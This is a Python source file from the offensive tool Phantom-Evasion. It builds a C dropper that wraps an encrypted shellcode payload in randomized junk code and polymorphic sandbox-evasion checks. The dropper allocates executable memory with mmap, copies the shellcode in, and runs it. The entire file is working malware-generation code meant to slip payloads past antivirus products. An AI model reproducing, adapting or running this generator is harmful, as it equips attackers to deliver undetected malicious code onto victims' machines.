
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import random, string
import sys 
sys.path.append("Modules/payloads/auxiliar")
sys.path.append("Modules/payloads/encryption")
import platform 
import usefull
import Multibyte_xor
import Multibyte_xorPy3

Payload = sys.argv[1]

Filename = sys.argv[2]

Encryption = sys.argv[3]

Randbufname = usefull.varname_creator()

Payload = usefull.encoding_manager(Encryption,Payload,Randbufname)

Randgood = usefull.varname_creator()

Randmem = usefull.varname_creator()

Randbig = random.randrange(60000000,120000000,1000000) 	

Randmaxop = usefull.varname_creator()

Randcpt	= usefull.varname_creator()

Randi =	usefull.varname_creator()

Randptr = usefull.varname_creator()

Randinj = usefull.varname_creator()

Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode3 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode4 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode5 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode6 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode7 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode8 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode9 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode

MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
 
MorphEvasion1 = MorphEvasion1.replace(".exe","")
MorphEvasion2 = MorphEvasion2.replace(".exe","")
MorphEvasion3 = MorphEvasion3.replace(".exe","")


Hollow_code = ""
Hollow_code += "#include <stdlib.h>\n#include <stdio.h>\n"
Hollow_code += "#include <unistd.h>\n"
Hollow_code += "#include <sys/mman.h>\n"
Hollow_code += "#include <string.h>\n"
Hollow_code += "#include <math.h>\n"
Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode1
Hollow_code += MorphEvasion1
Hollow_code += MorphEvasion2
Hollow_code += MorphEvasion3
Hollow_code += Junkcode2
Hollow_code += Payload
Hollow_code += Junkcode3
Hollow_code += "void *" + Randptr + ";"
Hollow_code += Junkcode4
Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
Hollow_code += Junkcode5
Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
Hollow_code += Junkcode6
Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
Hollow_code += "else{" + Junkcode7 + "}\n"
Hollow_code += "}else{" + Junkcode8 + "}\n"
Hollow_code += "}else{" + Junkcode9 + "}\n"
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)

